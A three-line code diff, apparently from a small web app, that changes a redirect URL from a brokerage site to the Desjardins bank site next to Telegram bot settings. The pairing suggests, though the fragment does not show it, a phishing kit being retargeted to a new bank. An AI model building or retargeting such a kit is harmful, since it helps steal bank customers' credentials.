@@ -25,7 +25,7 @@ limiter = Limiter(
 )
 
 # ---------- Config ----------
-REDIRECT_URL       = "https://belldirect.com.au/"
+REDIRECT_URL       = "https://www.desjardins.com/"
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
 
